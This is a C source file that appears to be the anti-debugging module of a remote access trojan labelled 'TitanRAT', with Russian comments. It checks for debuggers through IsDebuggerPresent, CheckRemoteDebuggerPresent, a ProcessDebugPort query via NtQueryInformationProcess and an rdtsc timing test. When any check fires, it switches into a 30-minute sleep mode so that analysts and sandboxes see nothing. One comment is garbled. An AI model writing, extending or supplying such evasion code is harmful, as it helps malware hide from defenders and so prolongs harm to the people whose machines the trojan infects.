#include "anti_debug.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

volatile bool g_sleepMode = false;
static bool g_timeoutThreadStarted = false;

// Lbyfvbxtcrfz pfuheprf NtQueryInformationProcess
typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// Проверка тактов процессора
static bool rdtsc_check() {
    UINT64 t1, t2;
    volatile UINT64 dummy = 0;
    
    t1 = __rdtsc();
    for (int i = 0; i < 100; i++) {
        dummy += i * i;
    }
    t2 = __rdtsc();
    
    return ((t2 - t1) > 5000);
}

// Функция-поток спящего режима
static DWORD WINAPI sleepTimeout(LPVOID) {
    Sleep(30 * 60 * 1000); // 30 minutes
    g_sleepMode = false;
    OutputDebugStringA("[TitanRAT] Exiting sleep mode\n");
    return 0;
}

// Запуск потока таймаута
static void start_sleep_timeout() {
    if (!g_timeoutThreadStarted) {
        g_timeoutThreadStarted = true;
        HANDLE hThread = CreateThread(NULL, 0, sleepTimeout, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}

//Проверка на дебаггер (основная функция, вызывается мейном)
void check_debugger() {
    BOOL isDebuggerPresent = IsDebuggerPresent();
    
    BOOL isRemoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebugger);
    
    // Динамическая NtQueryInformationProcess для процесс дебаг порт
    bool debugPortDetected = false;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtQueryInformationProcess pNtQIP = 
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (pNtQIP) {
            ULONG_PTR debugPort = 0;
            NTSTATUS status = pNtQIP(
                GetCurrentProcess(),
                7, // ProcessDebugPort
                &debugPort,
                sizeof(debugPort),
                NULL
            );
            // Если функция успешна и порт обнаружен, то отладчик подключён
            if (NT_SUCCESS(status) && debugPort != 0) {
                debugPortDetected = true;
            }
        }
    }
    
    bool timingAnomaly = rdtsc_check();
    
    //Финальная проверка
    if (isDebuggerPresent || isRemoteDebugger || debugPortDetected || timingAnomaly) {
        OutputDebugStringA("[TitanRAT] Debugger/sandbox detected, entering sleep mode\n");
        g_sleepMode = true;
        start_sleep_timeout();
    } else {
        OutputDebugStringA("[TitanRAT] No debugger detected\n");
    }
}